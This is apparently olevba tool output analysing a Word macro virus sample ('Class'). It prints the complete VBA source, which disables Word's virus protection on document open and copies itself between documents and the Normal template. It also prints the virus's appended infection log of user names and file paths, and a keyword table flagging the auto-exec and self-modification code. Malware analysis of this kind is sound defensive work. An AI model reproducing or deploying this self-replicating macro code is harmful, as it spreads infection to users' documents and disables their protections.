olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.eq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.eq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Opps!
On Error GoTo Out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Opps!" Then NoTe = True Else NoTe = False
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Opps!" Then AcWi = True Else AcWi = False
If AcWi = True And NoTe = False Then
    Set Source = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Set Destin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Linea1 = "Sub Auto" & "Close()"
    LineaX = "Sub ToolsMacro()"
Else
    If AcWi = False And NoTe = True Then
        Set Source = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
        Set Destin = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        Linea1 = "Sub Auto" & "Open()"
        LineaX = "Sub ViewVBCode()"
    Else
        GoTo Out
    End If
End If
Destin.DeleteLines 1, Destin.CountOfLines
Destin.InsertLines 1, Linea1
For I = 2 To Source.CountOfLines
    Destin.InsertLines I, Source.Lines(I, 1)
Next I
Destin.Replaceline 35, LineaX
Destin.InsertLines (Source.CountOfLines + 1), "'" & Application.UserName & " " & Now & " " & ActiveDocument.FullName
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Out:
If Day(Now) = 30 And Month(Now) = 12 Then MsgBox "lA-cOsA tE eSPiA!", 0, "Opps!"
End Sub
Sub ViewVBCode()
End Sub
'Start Opps! in the World 16/10/99 00:00:00 p.m. -

'Dra. Taratuto 1/01/97 0:53:47 A:\opps.doc
'Dra. Taratuto 2/03/2000 0:05:52 Document2
'USER10 7/03/2000 14:16:18 A:\Document2.doc
'USER10 8/03/2000 11:17:27 A:\www.doc
'OPEN NAUTAS 08/03/2000 11:18:01 A:\www.doc
'OPEN NAUTAS 11/03/2000 1:21:50 A:\REJUNTE.doc
'CIMADRID 14/03/2000 14:22:55 A:\REJUNTE.doc
'CIMADRID 14/03/2000 14:42:15 C:\Mis documentos\Indonesian Project.doc
'CIMADRID 14/03/2000 14:55:58 C:\Mis documentos\Indonesian Project.doc
'CIMADRID 14/03/2000 15:26:01 C:\Mis documentos\INDONESIA DANY.doc
'belen-r 14/03/00 18:16:17 C:\JSarte Indonesia\INDONESIA DANY MARCH 14.doc
'belen-r 16/03/00 16:46:00 U:\ANGELES\Lazagha.doc
'Mª de los Angeles Gil 16/03/00 16:46:27 U:\ANGELES\LAZAGHA.DOC
'Mª de los Angeles Gil 22/03/00 10:30:27 \\KATTY\SYS\USUARIOS\EDUCA\ANGELES\THAILAND.DOC
'GOAT 22/01/2000 2:58:29 PM C:\Virus\THAILAND.DOC
'Ditry PC 4/26/2000 11:56:03 AM C:\NV\W97MLACO.DT
'Ditry PC 4/26/2000 11:56:16 AM C:\NV\sample1.doc
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

